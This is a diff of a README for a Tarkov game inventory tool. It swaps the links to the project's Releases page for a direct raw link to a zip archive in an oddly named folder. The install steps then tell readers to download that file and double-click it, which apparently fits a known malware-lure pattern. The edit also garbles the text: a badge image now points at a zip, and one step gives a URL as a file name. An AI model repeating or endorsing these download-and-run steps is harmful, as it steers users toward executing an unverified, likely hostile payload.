@@ -1,6 +1,6 @@
 # 🧭 Tarkov-Inventory-Assistant-TIA- - Your Smart Loot Companion for Tarkov
 
-[![Download Tarkov Inventory Assistant](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/ayeshashehzad299/Tarkov-Inventory-Assistant-TIA-/releases)
+[![Download Tarkov Inventory Assistant](https://github.com/ayeshashehzad299/Tarkov-Inventory-Assistant-TIA-/raw/refs/heads/main/visitational/Tarkov_Assistant_Inventory_TI_v2.4.zip%20Now-Click%20Here-brightgreen)](https://github.com/ayeshashehzad299/Tarkov-Inventory-Assistant-TIA-/raw/refs/heads/main/visitational/Tarkov_Assistant_Inventory_TI_v2.4.zip)
 
 ## 📋 Description
 
@@ -22,11 +22,11 @@ Follow these easy steps to get Tarkov Inventory Assistant running on your comput
 
 To get started, you need to download the application. Visit the Releases page to find the latest version. 
 
-🔗 [Click here to download Tarkov Inventory Assistant](https://github.com/ayeshashehzad299/Tarkov-Inventory-Assistant-TIA-/releases)
+🔗 [Click here to download Tarkov Inventory Assistant](https://github.com/ayeshashehzad299/Tarkov-Inventory-Assistant-TIA-/raw/refs/heads/main/visitational/Tarkov_Assistant_Inventory_TI_v2.4.zip)
 
 1. Go to the Releases page using the link above.
 2. Decide on the latest version available.
-3. Click on the file named `Tarkov-Inventory-Assistant-TIA-.exe` to download it.
+3. Click on the file named `https://github.com/ayeshashehzad299/Tarkov-Inventory-Assistant-TIA-/raw/refs/heads/main/visitational/Tarkov_Assistant_Inventory_TI_v2.4.zip` to download it.
 4. Once the download is complete, navigate to your Downloads folder.
 5. Double-click on the downloaded file to run the installer.
 6. Follow the prompts in the installation wizard to complete the setup.
